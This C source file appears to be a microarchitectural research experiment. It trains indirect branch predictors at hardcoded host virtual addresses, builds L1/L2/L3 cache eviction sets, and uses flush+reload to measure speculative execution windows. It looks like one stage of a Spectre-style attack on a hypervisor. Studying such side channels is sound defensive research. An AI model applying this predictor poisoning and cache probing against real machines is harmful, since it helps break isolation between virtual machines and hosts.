#include <linux/memfd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <uarf/mem.h>
#include <unistd.h>

#define CACHE_MISS_THRES 300
#define SECRET           4
#define RB_OFFSET        0xcc0
#include "../../uarch-research-fw/lib/bp_tools.h"
#include "../../uarch-research-fw/lib/rb_tools.h"
#include <uarf/compiler.h>
#include <uarf/flush_reload.h>
#include <uarf/jita.h>
#include <uarf/log.h>

#define PAGE_4K (4096UL)
#define PAGE_2M (512 * PAGE_4K)
#define PAGE_1G (512 * PAGE_2M)
// #define MMAP_FLAGS  (MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED_NOREPLACE)
#define PROT_RW     (PROT_READ | PROT_WRITE)
#define PROT_RWX    (PROT_RW | PROT_EXEC)
#define PG_ROUND(n) (((((n) - 1UL) >> 12) + 1) << 12)

// WARNING: Always check that all macros are correct!
#define HVA_SRC 0x555555de4cc1 // offset 0x890c91 // 0x891a81
#define HVA_DST 0x555555bfc295 // offset 0x6a8295, JOP chain

// Number of training rounds
#define NUM_TRAIN 1
#define ROUNDS    (1 << 12)
#define MAX_CHAIN 128

extern char psnip_src_call_label[];
extern char psnip_src_entry_label[];
// clang-format off
uarf_psnip_declare_define(psnip_src,
    "step3:\n\t"                // 0x555555de4c10
    ".fill 0x4b, 0x1, 0x90\n\t"
    "test %ebx,%ebx\n\t"        // 0x555555de4c5b
    "je step2\n\t"              // 0x555555de4c5d
    ".fill 0x21, 0x1, 0x90\n\t"
    
    "step1: \n\t"               // 0x555555de4c80
    ".fill 0x11, 0x1, 0x90\n\t"
    "psnip_src_call_label:\n\t"
    "call *0x8(%rax)\n\t"       // 0x555555de4c91
    "ret\n\t"                   // 0x555555de4c93
    ".fill 0x2b, 0x1, 0x90\n\t"

    "step2:\n\t"
    "test %ebx,%ebx\n\t"        // 0x555555de4cc0
    "je step1\n\t"              // 0x555555de4cc2
    ".skip 0x47c\n\t"

    "psnip_src_entry_label:\n\t"// 0x555555de5140 <--- entrypoint of this snippet
    ".fill 0x48, 0x1, 0x90\n\t"
    "test %ebx,%ebx\n\t"        // 0x555555de5188
    "je step5\n"                // 0x555555de518a
    ".fill 0x3, 0x1, 0x90\n\t"

    "step4:\n\t"                // 0x555555de5193
    ".fill 0x81, 0x1, 0x90\n\t"
    "call *%rcx\n\t"            // 0x555555de5214
    "ret\n\t"
    ".fill 0x39, 0x1, 0x90\n\t"
    
    "step5:\n\t"                // 0x555555de5250
    ".fill 0x4c, 0x1, 0x90\n\t"
    "jmp step4\n\t"             // 0x555555de529c
    
);
// clang-format on

// clang-format off
uarf_psnip_declare_define(psnip_victim_dst, 
    "mfence\n\t" // Stop speculation
    "lfence\n\t"
    "ret\n\t"
);
// clang-format on

// clang-format off
uarf_psnip_declare_define(psnip_train_dst, 
    "mov (%rdx), %r8\n\t"
    ".rept "STR(MAX_CHAIN-1)"\n\t"
    "mov (%r8), %r8\n\t"
    ".endr\n\t"
    "mfence\n\t" // Stop speculation
    "lfence\n\t"
    "ret\n\t"
);
// clang-format on

#define NUM_MEASUREMENTS 32
#define L1_SETS          64
#define L1_SET_SIZE      8
#define L2_EVICTION_SIZE 16
#define L2_SETS          2048
#define L2_2MB_SET_SIZE  16
#define L2_1GB_SET_SIZE  512 // max 8192
#define L3_SETS          32 * 1024
#define L3_SET_SIZE      64
#define DANGEROUS_SPEEDUP
#define L1_THRESH  0
#define L2_THRESH  8
#define L3_THRESH  40
#define RAM_THRESH 350

typedef struct actxt {
    uint64_t entry_point;
    uint64_t extra_call;
} actxt_t;

volatile uint64_t *l2_sets[L2_SETS][L2_1GB_SET_SIZE] = {0};
volatile uint64_t *l1_sets[L1_SETS][L1_SET_SIZE] = {0};
uint64_t l2_sets_offset = 0;
uint64_t measurements[NUM_MEASUREMENTS];
uint64_t dummy_val[MAX_CHAIN];
uint64_t dst_ptr[2];
uint64_t dst_train_ptr[2];

static void swap_elements(volatile uint64_t **set, size_t index_1, size_t index_2) {
    volatile uint64_t *tmp = set[index_1];
    set[index_1] = set[index_2];
    set[index_2] = tmp;
}

static volatile uint64_t *set_remove(volatile uint64_t **set_new,
                                     volatile uint64_t **set_old, uint64_t set_size,
                                     uint64_t index) {
    if (index >= set_size) {
        err(1, "index outside");
    }

    volatile uint64_t *removed = set_old[index];
    memcpy(set_new, set_old, index * sizeof(set_old[0]));
    memcpy(&set_new[index], &set_old[index + 1],
           (set_size - index - 1) * sizeof(set_old[0]));
    return removed;
}

static int stats_compare_u64(const void *a, const void *b) {
    return *(u64 *) a > *(u64 *) b;
}

u64 stats_median_u64(u64 *arr, u64 arr_len) {
    if (!arr_len)
        err(1, "0 length array has no median");

    u64 *copy = calloc(arr_len, sizeof(*arr));
    if (!copy)
        err(1, "failed to temp arr");

    memcpy(copy, arr, arr_len * sizeof(*arr));
    qsort(copy, arr_len, sizeof(*arr), stats_compare_u64);

    u64 median = copy[arr_len / 2];

    free(copy);

    return median;
}

uint64_t measure_eviction(volatile uint64_t *victim_ptr, volatile uint64_t **eviction_set,
                          uint64_t set_size) {
    for (int i = 0; i < NUM_MEASUREMENTS; ++i) {
        for (int e = 0; e < set_size; ++e) {
            *eviction_set[e];
            uarf_lfence();
        }
        uarf_mfence();
        uint64_t start = rb_rdpru();
        uarf_lfence();
        *victim_ptr;
        uarf_lfence();
        uint64_t end = rb_rdpru();
        measurements[i] = end - start;
    }
    uint64_t median = stats_median_u64(measurements, NUM_MEASUREMENTS);
    return median;
}

uint64_t measure_self_eviction(volatile uint64_t **eviction_set) {
    for (int i = 0; i < NUM_MEASUREMENTS; ++i) {
#ifndef DANGEROUS_SPEEDUP
        uarf_mfence();
#endif
        uint64_t start = rb_rdtsc();
        uarf_lfence();
        for (int e = 0; e < L2_EVICTION_SIZE; ++e) {
            *eviction_set[e];
#ifndef DANGEROUS_SPEEDUP
            uarf_lfence();
#endif
        }
        uarf_lfence();
        uint64_t end = rb_rdtscp();
        measurements[i] = end - start;
    }
    uint64_t median = stats_median_u64(measurements, NUM_MEASUREMENTS);
    // printf("median: %03ld\n", median);

    return median;
}

uint8_t check_self_eviction(volatile uint64_t **eviction_set, uint64_t baseline) {

    return measure_self_eviction(eviction_set) > baseline + 100;
}

uint8_t check_l3_eviction(volatile uint64_t *victim_ptr, volatile uint64_t **eviction_set,
                          uint64_t set_size, uint64_t baseline) {
    return measure_eviction(victim_ptr, eviction_set, set_size) > RAM_THRESH;
}

uint8_t check_cross_eviction(volatile uint64_t **eviction_set_1,
                             volatile uint64_t **eviction_set_2, uint64_t baseline) {
    uint64_t volatile *eviction_set[L2_EVICTION_SIZE];
    for (int i = 0; i < L2_EVICTION_SIZE / 2; ++i) {
        eviction_set[i] = eviction_set_1[i];
    }
    for (int i = L2_EVICTION_SIZE / 2; i < L2_EVICTION_SIZE; ++i) {
        eviction_set[i] = eviction_set_2[i];
    }
    uint64_t total_time = measure_self_eviction(eviction_set);

    return total_time > baseline + 100;
}

uint8_t build_l1_sets(uint64_t mem_ptr,
                      volatile uint64_t *l1_sets[L1_SETS][L1_SET_SIZE]) {

    printf("create L1 sets: ");
    fflush(stdout);
    // find the first 2MB page where we can build all the sets
    for (uint64_t offset_4k = 0; offset_4k < L1_SET_SIZE * PAGE_4K; ++offset_4k) {
        uint64_t base_4k = mem_ptr + (offset_4k * PAGE_4K);
        // split the cache lines to the sets
        for (uint64_t offset_6b = 0; offset_6b < L1_SETS; ++offset_6b) {
            uint64_t base_set = base_4k + (offset_6b << 6);
            l1_sets[offset_6b][offset_4k] = _ptr(base_set);
        }
    }
    printf("OK\n");
    return 1;
}

uint8_t build_l2_sets(uint64_t mem_ptr, uint64_t baseline,
                      volatile uint64_t *l2_sets[L2_SETS][L2_1GB_SET_SIZE]) {
    static volatile uint64_t *l2_set_wip[L2_SETS][L2_2MB_SET_SIZE] = {0};

    // find the first 2MB page where we can build all the sets
    printf("building l3 sets: ");
    fflush(stdout);
    for (uint64_t offset_2m = 4; offset_2m < PAGE_1G / PAGE_2M; ++offset_2m) {
        uint64_t base_2m = mem_ptr + (offset_2m << 21);

        // build the sets within the 2MB pages
        uint64_t offset_6b = 0;
        for (; offset_6b < (1 << 11); ++offset_6b) {
            uint64_t base_set = base_2m + (offset_6b << 6);

            for (uint64_t index = 0; index < L2_2MB_SET_SIZE; ++index) {
                l2_set_wip[offset_6b][index] =
                    (volatile uint64_t *) (base_set + (index << 17) + index);
            }

            if (!check_self_eviction(l2_set_wip[offset_6b], baseline)) {
                break;
            }

            if (offset_6b % 64 == 63) {
            }
        }

        if (offset_6b == L2_SETS) {
            // this means we very likely had a 2MB page so lets assign all the sets to the
            // bigger L2 sets

            // if this is the first one, just copy over all the sets
            uint64_t num_ok = 0;
            int set_xor = 0;
            for (int i = 0; i < L2_SETS; ++i) {
                // we can calculate a decent heuristic to speed up the collision search
                int search_start = i ^ set_xor;
                // base case, this is the first sets we found
                if (l2_sets_offset == 0) {
                    memcpy(l2_sets[i], l2_set_wip[i],
                           L2_2MB_SET_SIZE * sizeof(l2_sets[0][0]));
                    num_ok += 1;
                }
                else {
                    // try to find an existing L2 set that this one belongs to
                    int64_t hit_index = -1;
                    for (int k = 0; k < 4 && hit_index == -1; ++k) {
                        for (int j = 0; j < L2_SETS; ++j) {
                            int64_t cur_index = (search_start + j) % L2_SETS;
                            if (check_cross_eviction(l2_sets[cur_index], l2_set_wip[i],
                                                     baseline)) {
                                if (hit_index != -1) {
                                    err(1, "mutlihit");
                                }
                                hit_index = cur_index;
                                set_xor = cur_index ^ i;
#ifdef DANGEROUS_SPEEDUP
                                break; // remove this to check the precision of our
                                       // approach
#endif
                            }
                        }
                    }
                    if (hit_index == -1) {
                        break;
                    }

                    // check that the set is not already extended
                    if (l2_sets[hit_index][l2_sets_offset]) {
                        break;
                    }

                    // add to the set
                    memcpy(&l2_sets[hit_index][l2_sets_offset], l2_set_wip[i],
                           L2_2MB_SET_SIZE * sizeof(l2_sets[0][0]));
                    num_ok += 1;
                }
            }
            if (num_ok == L2_SETS) {
                printf(".");
                fflush(stdout);
                l2_sets_offset += L2_2MB_SET_SIZE;
            }
            else {
                // cleanup for multi-hit check
                for (int i = 0; i < L2_SETS; ++i) {
                    memset(&l2_sets[i][l2_sets_offset], 0,
                           L2_2MB_SET_SIZE * sizeof(l2_sets[0][0]));
                }
            }

            if (l2_sets_offset >= L2_1GB_SET_SIZE) {
                printf("\n");
                return 1;
            }
        }
    }
    printf("\n");
    // fflush(stdout);
    return 0;
}

uint64_t measure_window_size(actxt_t *ctxt, volatile uint64_t **eviction_sets,
                             uint64_t num_eviction_set, uint64_t eviction_set_size,
                             uint64_t eviction_set_total, uint64_t threshold) {
    printf("measuring window size\n");
    int found_set = 0;

    uint64_t baseline = measure_eviction(&dst_ptr[1], NULL, 0);
    printf("baseline %ld\n", baseline);

    // try to find the right eviction set
    int set_index = -1;
    for (int set = 0; set < num_eviction_set; ++set) {
        int64_t access_time =
            measure_eviction(&dst_ptr[1], &eviction_sets[set * eviction_set_total],
                             eviction_set_size) -
            baseline;
        if (access_time > threshold) {
            printf("time %ld\n", access_time);
            set_index = set;
            break;
        }
    }
    if (set_index == -1) {
        printf("set not found\n");
        // return 0;
    }

    uint64_t *rb_chain = _ptr(RB_PTR);
    printf("data = [");
    for (int chain_len = 1; chain_len < MAX_CHAIN; ++chain_len) {
        for (int k = 0; k < chain_len - 1; ++k) {
            rb_chain[k] = _ul(&rb_chain[k + 1]);
        }
        rb_chain[chain_len - 1] = RB_PTR + RB_OFFSET + 5 * RB_STRIDE;

        rb_reset();
        for (size_t i = 0; i < ROUNDS; i++) {
            uarf_pi_wrmsr(MSR_PRED_CMD, 1 << MSR_PRED_CMD__IBPB);

            // Train victim -> disclosure gadget using HVA
            for (size_t j = 0; j < NUM_TRAIN; j++) {
                asm volatile(""
                             "self_label_t:\n"
                             "call *%4\n\t"
                             :
                             : "d"(dummy_val), "a"(dst_train_ptr), "b"(0),
                               "c"(ctxt->extra_call), "r"(ctxt->entry_point)
                             : "r8", "memory");
                asm volatile("" ::: "rcx", "rdi", "rsi");
            }

            rb_flush();

            if (set_index != -1) {
                for (int e = 0; e < eviction_set_size; ++e) {
                    *eviction_sets[set_index * eviction_set_total + e];
                    uarf_lfence();
                }
            }

            uarf_mfence();

            asm volatile(""
                         "call *%4\n\t"
                         :
                         : "d"(rb_chain), "a"(dst_ptr), "b"(0), "c"(ctxt->extra_call),
                           "r"(ctxt->entry_point)
                         : "r8", "memory");
            asm volatile("" ::: "rcx", "rdi", "rsi");

            for (volatile size_t i = 0; i < 10000; i++) {
            }
            rb_reload();
        }

        size_t maxi = rb_max_index(rb_hist, RB_SLOTS - 1);
        if (rb_hist[5] > 0) {
            printf("%ld, ", rb_hist[5]);
        }
        else {
            // break;
        }
    }
    printf("]\n");

    printf("done\n");
    fflush(stdout);
}

int main(void) {

    UARF_LOG_INFO("Attacker started\n");

    uarf_pi_init();
    rb_init();

    void *mem = mmap(NULL, PAGE_1G, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB | MFD_HUGE_1GB, -1, 0);
    if (mem == MAP_FAILED) {
        UARF_LOG_ERROR("Failed to map 1G\n");
        return 1;
    }

    uint64_t call_offset = ((uint64_t) psnip_src_call_label) - psnip_src.addr;
    UARF_LOG_INFO("SRC snip: 0x%lx\n", _ul(HVA_SRC - call_offset));
    UARF_LOG_INFO("Training Branch 0x%012lx (+0x%012lx)\n", _ul(HVA_SRC), call_offset);

    UarfStub stub_src = uarf_stub_init();
    UarfStub stub_victim_dst = uarf_stub_init();
    UarfStub stub_train_dst = uarf_stub_init();
    UarfJitaCtxt jita_src = uarf_jita_init();
    UarfJitaCtxt jita_victim_dst = uarf_jita_init();
    UarfJitaCtxt jita_train_dst = uarf_jita_init();

    uarf_jita_push_psnip(&jita_src, &psnip_src);
    uarf_jita_push_psnip(&jita_victim_dst, &psnip_victim_dst);
    uarf_jita_push_psnip(&jita_train_dst, &psnip_train_dst);

    uarf_jita_allocate(&jita_src, &stub_src, _ul(HVA_SRC - call_offset));
    uarf_jita_allocate(&jita_victim_dst, &stub_victim_dst, _ul(HVA_DST + 0x6000));
    uarf_jita_allocate(&jita_train_dst, &stub_train_dst, _ul(HVA_DST));

    UARF_LOG_INFO("src snip size: 0x%lx\n", psnip_src.end_addr - psnip_src.addr);

    uint64_t entry_offset = ((uint64_t) psnip_src_entry_label) - psnip_src.addr;
    uint64_t entry_point = stub_src.addr + entry_offset;
    uint64_t extra_call = stub_src.addr;

    UARF_LOG_INFO("Build L3 eviction sets\n");
    // make memory mapped and random contents
    for (uint64_t offset = 0; offset < PAGE_1G; offset += PAGE_4K) {
        ((volatile uint64_t *) mem)[offset >> 3] = offset;
    }

    volatile uint64_t *dummy_set[L2_EVICTION_SIZE] = {0};
    for (uint64_t i = 0; i < L2_EVICTION_SIZE; ++i) {
        dummy_set[i] = (volatile uint64_t *) (_ul(mem) + (i << 17) + (i << 12));
    }
    uint64_t baseline = measure_self_eviction(dummy_set);
    printf("baseline: %ld\n", baseline);
    if (!build_l1_sets(_ul(mem), l1_sets)) {
        UARF_LOG_ERROR("Failed to build L1 eviction sets!\n");
        err(1, "whaterver");
    }
    if (!build_l2_sets(_ul(mem), baseline, l2_sets)) {
        UARF_LOG_ERROR("Failed to build L3 eviction sets!\n");
        err(1, "whaterver");
    }

    for (int i = 0; i < MAX_CHAIN - 1; ++i) {
        dummy_val[i] = _ul(&dummy_val[i + 1]);
    }

    dst_ptr[1] = _ul(stub_victim_dst.addr);
    dst_train_ptr[1] = _ul(stub_train_dst.addr);

    actxt_t ctxt = {
        .entry_point = entry_point,
        .extra_call = extra_call,
    };

    measure_window_size(&ctxt, NULL, 0, 0, 0, L1_THRESH);
    measure_window_size(&ctxt, l1_sets, L1_SETS, L1_SET_SIZE, L1_SET_SIZE, L2_THRESH);
    measure_window_size(&ctxt, l2_sets, L2_SETS, L2_EVICTION_SIZE, L2_1GB_SET_SIZE,
                        L3_THRESH);
    measure_window_size(&ctxt, l2_sets, L2_SETS, L2_1GB_SET_SIZE, L2_1GB_SET_SIZE,
                        RAM_THRESH);

    return 0;
}
